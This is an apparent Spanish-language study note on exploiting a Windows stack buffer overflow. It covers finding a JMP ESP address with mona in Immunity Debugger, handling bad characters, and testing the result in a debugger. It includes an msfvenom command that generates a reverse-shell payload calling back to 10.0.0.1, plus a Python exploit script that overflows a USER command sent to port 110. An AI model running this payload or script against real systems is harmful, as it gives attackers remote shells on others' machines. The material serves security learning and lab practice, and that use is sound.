
---
Tags: #shellcode #ESP #badcharts #buffer #bufferoverflow #mona #inmunityDebuger #msfvenom 

---

> Objetivo: conseguir una dirección (en un módulo estable) que contenga un opcode tipo `JMP ESP` o similar. Sobrescribir EIP con esa dirección para que el flujo salte a ESP, donde estará nuestro shellcode.

---

## 1) Idea esencial (1 frase)

No siempre podemos apuntar EIP directamente a nuestro shellcode. Buscamos en memoria una instrucción que haga `JMP ESP` y ponemos su dirección en EIP. Al ejecutar ese opcode el CPU saltará a ESP y ejecutará el shellcode que hemos colocado allí.

---

## 2) Requisitos previos (chequeo rápido)

- Badchars identificados y excluidos.
    
- Offset controlado (posición donde sobrescribes EIP).
    
- Módulo sin ASLR/DEP preferible o con dirección predecible.
    
- Tener `Immunity Debugger` + `mona.py` instalado.
    
- Shellcode generado (msfvenom o pwntools) sin badchars.
    

---

## 3) Buscar `JMP ESP` con mona (comandos útiles)

- Buscar dentro de todos los módulos (más ruidoso):
    

`!mona jmp -r esp`

- Buscar dentro de un módulo concreto (recomendado; ej. `essfunc.dll`):
    

`!mona jmp -r esp -m essfunc.dll`

- Alternativa genérica buscando opcodes (ej. `FF E4` = `JMP ESP`):
    

`!mona find -s "\xff\xe4" -m essfunc.dll`

Salida típica de `!mona jmp`:

- Lista de direcciones válidas con info: dirección, módulo, protección, si contiene badchars, y si es safe (no tiene referencias a SEH/stack pivots).
    
- Elige una dirección que **no** contenga badchars en sus bytes y que esté en un módulo sin ASLR o con base estable.
    

---

## 4) Validar la dirección elegida

1. Comprueba que la dirección no contenga bytes que hayas detectado como badchars (por ejemplo `\x00`, `\x0a`).
    
2. En Immunity, pon un breakpoint en la instrucción (o usa `eip = <addr>` en el script) y verifica que al ejecutar se hace `JMP ESP`.
    
3. Asegúrate de que esa dirección pertenece a un módulo cargado consistentemente (no al stack ni heap).
    

---

## 5) Generar shellcode excluyendo badchars (ejemplo msfvenom)

`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -b "\x00\x0a\x0d" -f python`

- `-b` lista badchars detectados.
    
- `-f python` te da el array listo para pegar en un script Python.
    

---

## 6) Construir payload en Python (ejemplo típico)

```python
import struct, socket, time

IP="192.168.1.145"; PORT=110
offset = 260                      # offset donde sobrescribes EIP
jmp_esp_addr = 0x625011AF         # dirección encontrada con mona (ejemplo)
# cargar shellcode generado por msfvenom (como bytes)
shellcode = b"\x90..."            

payload = b"A"*offset
payload += struct.pack("<I", jmp_esp_addr)   # EIP <- address (little-endian)
payload += b"\x90"*16                        # NOP sled
payload += shellcode

s = socket.create_connection((IP,PORT), timeout=3)
s.recv(1024)
s.sendall(b"USER " + payload + b"\r\n")
time.sleep(0.2)
s.close()

```

Notas:

- `struct.pack("<I", addr)` empaca a little-endian para x86. En x64 usar `"<Q"` y ajustar tamaño de overwrite.
    
- Asegúrate que `jmp_esp_addr` no contenga badchars cuando se serializa (`pack` produce bytes). Si sí, busca otra dirección.
    

---

## 7) Probar en el depurador (pasos)

1. Pon un breakpoint en la ejecución justo antes del retorno al EIP (o usa `!mona seh`/`!mona jmp`).
    
2. Ejecuta el programa con el payload.
    
3. Observa EIP: debe contener la dirección que pusiste.
    
4. Stepa (F7/F8) y verifica que se ejecuta `JMP ESP` y que EIP pasa a la dirección de ESP.
    
5. Verifica que en ESP está tu NOP+shellcode y que al ejecutar se llega a shellcode.
    

---

## 8) Problemas comunes y soluciones

- **EIP contiene dirección con badchars** -> elegir otra dirección sin badchars.
    
- **JMP ESP apunta fuera del buffer** -> usar NOP-sled y/o ajustar padding para que ESP apunte al inicio del NOP.
    
- **ASLR/DEP** -> si módulo tiene ASLR o DEP activo, la dirección puede cambiar; busca módulos sin ASLR o usar ROP/mprotect.
    
- **Módulo no cargado en instancias diferentes** -> elige módulos presentes en todas las ejecuciones o usar técnica de infoleak.
    
- **Shellcode no ejecuta** -> comprueba que no haya filtros que modifiquen bytes (newline stripping, unicode conversion). Usa `latin-1` en envíos raw y encoders si hace falta.
    

---

## 9) Checklist rápido final

-  Offset correcto.
    
-  Badchars listada.
    
-  Shellcode generado sin badchars.
    
-  `JMP ESP` encontrado en módulo estable.
    
-  Dirección empaquetada sin badchars.
    
-  Payload probado en Immunity y verificado salto a ESP.
    

---

## 10) Snippets adicionales útiles

- Comprobar bytes de la dirección empaquetada:
    

```python
import struct
addr = 0x625011AF
print(struct.pack("<I", addr))   # mostrar bytes a enviar

```

- Ver direcciones candidatas desde mona, copiar y pegarlas en tu script.